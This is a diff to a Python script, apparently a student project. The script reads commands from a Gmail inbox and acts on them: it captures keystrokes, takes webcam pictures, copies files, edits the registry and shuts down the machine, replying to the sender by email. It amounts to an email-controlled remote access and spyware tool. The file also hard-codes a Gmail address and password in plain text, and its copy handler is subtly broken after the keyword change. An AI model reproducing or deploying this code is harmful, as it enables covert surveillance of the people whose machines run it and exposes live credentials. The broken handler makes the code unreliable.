@@ -12,6 +12,8 @@ from reply_camera_capture import reply_camera_capture
 from reply_copy_file import reply_copy_file
 #from reply_registry import reply_modify_reg
 
+import ui
+
 USERNAME = 'networkingass20120015@gmail.com'
 PASSWORD = 'rrsdrqjjwudklnjx'
 
@@ -37,6 +39,11 @@ if __name__ == '__main__':
                     
                     email_message = email.message_from_bytes(bytes_data)
                     
+                    print(email_message['From'])
+                    
+                    if email_message['From'] not in ui.mailList:
+                        continue
+                    
                     body_message = ''
                     
                     for elem in email_message.walk():
@@ -59,24 +66,24 @@ if __name__ == '__main__':
                             print(pid)
                         except:
                             pass
-                    elif 'shutdown' in body_message:
+                    elif 'SHUTDOWN' in body_message:
                         pass
                         #reply_shutdown(email_message, USERNAME, PASSWORD)
-                    elif 'restart' in body_message:
+                    elif 'RESET' in body_message:
                         pass
                         #reply_restart(email_message, USERNAME, PASSWORD)
-                    elif 'catch pressed key' in body_message:
+                    elif 'CATCH KEYBOARD' in body_message:
                         reply_pressed_key(email_message, USERNAME, PASSWORD)
-                    elif 'camera' in body_message:
+                    elif 'WEBCAM' in body_message:
                         reply_camera_capture(email_message, USERNAME, PASSWORD)
-                    elif 'copy' in body_message:
+                    elif 'COPY' in body_message:
                         # Kinda lazy let just do this for now
                         ls = body_message.split()
                         pos = ls.index('copy')
                         
                         if pos + 2 < len(ls):
                             reply_copy_file(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2])
-                    elif 'reg' in body_message:
+                    elif 'REG' in body_message:
                         pass
                         ls = body_message.split()
                         pos = -1
